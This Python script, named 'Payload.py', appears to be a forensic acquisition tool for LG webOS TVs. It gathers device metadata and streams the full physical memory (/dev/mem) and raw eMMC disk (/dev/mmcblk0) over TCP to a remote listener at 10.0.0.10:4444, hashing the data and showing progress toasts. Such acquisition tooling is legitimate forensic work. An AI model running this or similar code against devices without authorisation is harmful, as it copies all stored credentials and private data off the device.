import os
import json
import subprocess
import threading
import datetime
import hashlib
import socket
import sys

SCRIPT_NAME='ddTV'
REMOTE_HOST="10.0.0.10"
REMOTE_PORT=4444
SRC_APPID='com.webos.service.secondscreen.gateway'
CHUNK = 4 * 1024 * 1024

def main():
    toast("Payload.py intialized")
    start_dump()

def toast(message):
    payload = {
        "sourceId": SRC_APPID,
        "message": f"<h3>{SCRIPT_NAME}</h3>{message}"
    }
    subprocess.run(
        ["luna-send", "-w", "1000", "-n", "1", "-a", SRC_APPID,
         "luna://com.webos.notification/createToast", json.dumps(payload)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False
    )

def utc():
    return datetime.datetime.now(datetime.timezone.utc).isoformat()

def read_text(path):
    try:
        with open(path, "rb") as f:
            return f.read().strip().decode('utf-8', errors='replace')
    except OSError:
        return None

def readable_ranges():
    ranges = []
    try:
        with open("/proc/iomem", "rb") as f:
            for line in f:
                line = line.decode('utf-8', errors='replace')
                if "System RAM" in line:
                    addr_range = line.split(":")[0].strip()
                    start, end = addr_range.split("-")
                    ranges.append((int(start, 16), int(end, 16)))
    except OSError as e:
        print(f"Cannot read /proc/iomem: {e}", file=sys.stderr)
    return ranges

def device_size(path):
    if path == "/dev/mem":
        with open("/proc/meminfo", "rb") as f:
            for line in f:
                line = line.decode('utf-8', errors='replace')
                if line.startswith("MemTotal:"):
                    return int(line.split()[1]) * 1024
        return None
    try:
        with open(path, "rb", buffering=0) as f:
            size = f.seek(0, os.SEEK_END)
            if size > 0:
                return size
    except OSError as e:
        print(f"Cannot determine size of {path}: {e}", file=sys.stderr)
    return None

def collect_metadata():
    u = os.uname()
    meta = {
        "uname": f"{u.sysname} {u.nodename} {u.release} {u.version} {u.machine}",
        "partitions": read_text("/proc/partitions"),
        "mounts": read_text("/proc/mounts"),
        "meminfo": "\n".join((read_text("/proc/meminfo") or "").splitlines()[:3]),
        "cpu": next((l for l in (read_text("/proc/cpuinfo") or "").splitlines()
                     if l.lower().startswith(("hardware", "model"))), None),
    }
    for label, path in (("os_release", "/etc/os-release"),
                        ("starfish_release", "/etc/starfish-release"),
                        ("webos_os_info", "/var/run/nyx/os_info.json"),
                        ("webos_device_info", "/var/run/nyx/device_info.json")):
        val = read_text(path)
        if val:
            meta[label] = val
    return {k: v for k, v in meta.items() if v}

def dump(recv_host, recv_port, source, examiner, progress_callback=None, metadata=None):
    size = device_size(source)
    is_mem = source == "/dev/mem"

    header = {
        "source": source,
        "size": size,
        "examiner": examiner,
        "start_utc": utc(),
        "chunk": CHUNK,
        "tv_metadata": metadata or {},
    }

    sha, md5, sent = hashlib.sha256(), hashlib.md5(), 0
    last_progress = -1

    s = socket.create_connection((recv_host, recv_port))
    s.sendall((json.dumps(header, ensure_ascii=True) + "\n").encode('utf-8', errors='replace'))

    with open(source, "rb", buffering=0) as dev:
        if is_mem:
            ranges = readable_ranges()
            if not ranges:
                raise RuntimeError("No readable RAM ranges found in /proc/iomem")
            for start, end in ranges:
                dev.seek(start)
                remaining = end - start + 1
                while remaining > 0:
                    buf = dev.read(min(CHUNK, remaining))
                    if not buf:
                        break
                    s.sendall(buf)
                    sha.update(buf)
                    md5.update(buf)
                    sent += len(buf)
                    remaining -= len(buf)
                    if size:
                        progress = sent * 100 // size
                        if progress >= last_progress + 5:
                            last_progress = progress
                            if progress_callback:
                                progress_callback(progress, sent, size)
        else:
            while True:
                buf = dev.read(CHUNK)
                if not buf:
                    break
                s.sendall(buf)
                sha.update(buf)
                md5.update(buf)
                sent += len(buf)
                if size:
                    progress = sent * 100 // size
                    if progress >= last_progress + 5:
                        last_progress = progress
                        if progress_callback:
                            progress_callback(progress, sent, size)
                elif progress_callback and sent % (10 * 1024 * 1024) < CHUNK:
                    progress_callback(None, sent, 0)

    trailer = {
        "source_sha256": sha.hexdigest(),
        "source_md5": md5.hexdigest(),
        "bytes_sent": sent,
        "end_utc": utc()
    }

    s.sendall((json.dumps(trailer, ensure_ascii=True) + "\n").encode('utf-8', errors='replace'))
    s.shutdown(socket.SHUT_WR)
    s.close()
    print(json.dumps(trailer, indent=2), file=sys.stderr)

    if size and sent != size:
        print(f"WARNING: sent {sent} != device size {size}", file=sys.stderr)

    return trailer

def dump_worker():
    try:
        toast("Starting forensic extraction...")

        def report_progress(percent, sent, total):
            if percent is not None:
                toast(f"Extraction: {percent}% ({sent}/{total} bytes)")
            else:
                toast(f"Extracted {sent} bytes")

        metadata = collect_metadata()

        toast("Starting memory extraction...")
        result = dump(REMOTE_HOST, REMOTE_PORT, "/dev/mem", "Examiner1", progress_callback=report_progress, metadata=metadata)
        toast(f"Memory extraction completed! {result['bytes_sent']} bytes transferred.")

        toast("Starting disk extraction...")
        result = dump(REMOTE_HOST, REMOTE_PORT, "/dev/mmcblk0", "Examiner1", progress_callback=report_progress, metadata=metadata)
        toast(f"Disk extraction completed! {result['bytes_sent']} bytes transferred.")

    except Exception as e:
        toast(f"Extraction failed: {str(e)}")
        raise

def start_dump():
    thread = threading.Thread(target=dump_worker, daemon=False)
    thread.start()
    return thread

if __name__ == "__main__":
    main()